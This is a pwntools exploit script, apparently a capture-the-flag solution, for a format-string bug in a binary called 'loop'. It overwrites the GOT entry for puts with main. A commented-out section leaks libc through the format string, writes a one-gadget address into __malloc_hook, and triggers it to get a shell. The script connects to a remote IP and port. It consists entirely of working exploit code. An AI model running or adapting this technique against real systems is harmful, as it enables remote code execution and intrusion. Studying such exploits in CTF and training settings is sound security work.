from pwn import *
context.arch = 'amd64'

elf = ELF('./loop')
if len(sys.argv) == 1:
	ONE_SHOT = 0x4f322  # ubuntu 18.04
	libc = elf.libc
	s = process('./loop')
else:
	ONE_SHOT = 0x4526a
	libc = ELF('./libc.so.6')
	s = remote('15.165.78.226', 2311)


payload = fmtstr_payload(18, {elf.got['puts']: (elf.symbols['main'] & 0xffff)})

log.info("Payload Length: "+hex(len(payload)))
pause()
s.sendlineafter('name? ', payload)

'''
payload = '%18$s'
payload += '\x00' * (48 - len(payload))
payload += p64(elf.got['fgets'])
s.sendlineafter('name? ', payload)
s.recvuntil('Hello ')
libc.address = u64(s.recv(6).ljust(8, '\x00')) - libc.symbols['fgets']
print 'libc @ ' + hex(libc.address)

addr = libc.symbols['__malloc_hook']
target = libc.address + ONE_SHOT # one shot
count = 0
while target:
	payload = '%{}c%18$hn'.format(target & 0xffff)
	payload += '\x00' * (48 - len(payload))
	payload += p64(addr)
	s.sendlineafter('name? ', payload)
	addr += 2
	target >>= 16
	print target
	print addr
	count += 1
s.sendlineafter('name? ', '%66000c')
s.recv()
log.critical(count)
'''
s.interactive()
